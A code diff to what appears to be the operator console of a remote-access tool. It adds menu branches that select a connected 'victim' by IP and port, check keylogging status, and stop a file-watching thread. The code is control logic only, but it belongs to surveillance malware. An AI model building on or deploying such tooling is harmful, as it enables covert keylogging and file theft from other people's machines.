@@ -132,6 +132,24 @@ if __name__ == '__main__':
                                 pass
 
                     # CASE 3: [Multiple Clients] Watch File for a specific connected victim
+                    elif len(connected_clients) != constants.ZERO:
+                        target_ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
+                        target_port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
+                        (target_socket, target_ip,
+                         target_port, status, status_2) = find_specific_client_socket(connected_clients,
+                                                                                      target_ip,
+                                                                                      target_port)
+
+                        if target_socket:
+                            if is_keylogging(status, target_ip, target_port, constants.KEYLOG_STATUS_TRUE_ERROR):
+                                pass
+                            if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
+                                pass
+                            else:
+                                print("[+] PENDING IMPLEMENTATION: Watch File for multiple clients is "
+                                      "under development!")
+                        else:
+                            print(constants.TARGET_VICTIM_NOT_FOUND)
 
                     # Print closing statements
                     print(constants.RETURN_MAIN_MENU_MSG)
@@ -186,6 +204,50 @@ if __name__ == '__main__':
                                 pass
                         else:
                             print(constants.NOT_WATCHING_FILE_ERROR)
+
+                    # CASE 3: [Multiple Clients] Watch File for a specific connected victim
+                    elif len(connected_clients) != constants.ZERO:
+                        target_ip = input(constants.ENTER_TARGET_IP_START_KEYLOG)
+                        target_port = int(input(constants.ENTER_TARGET_PORT_START_KEYLOG))
+                        (target_socket, target_ip,
+                         target_port, status, status_2) = find_specific_client_socket(connected_clients,
+                                                                                      target_ip,
+                                                                                      target_port)
+
+                        if target_socket:
+                            if is_keylogging(status, target_ip, target_port, constants.KEYLOG_STATUS_TRUE_ERROR):
+                                pass
+                            if not is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
+                                print(constants.NOT_WATCHING_FILE_ERROR)
+                                pass
+                            else:
+                                if is_watching(status_2, target_ip, target_port, constants.WATCH_STATUS_TRUE_ERROR):
+                                    try:
+                                        # a) Stop Thread + Signal to client + Update Status
+                                        if global_thread is not None:
+                                            print(constants.THREAD_STOPPING_MSG.format(global_thread.name))
+                                            print(constants.STOP_WATCH_FILE_TIP.format(target_ip, target_port))
+                                            signal_queue.put(constants.STOP_KEYWORD)
+
+                                            # Wait for thread to finish
+                                            global_thread.join()
+                                            print(constants.THREAD_STOPPED_MSG)
+
+                                            # Set global thread to None
+                                            global_thread = None
+
+                                    except KeyboardInterrupt:
+                                        # Wait for thread to finish
+                                        global_thread.join()
+
+                                        # Set global thread to None
+                                        global_thread = None
+                                        print(constants.KEYBOARD_INTERRUPT_MSG)
+                                        print(constants.STOP_WATCH_THREAD_CONCURRENCY_WARNING.format(target_ip,
+                                                                                                     target_port))
+                                        pass
+                        else:
+                            print(constants.TARGET_VICTIM_NOT_FOUND)
 
                     # Print closing statements
                     print(constants.RETURN_MAIN_MENU_MSG)
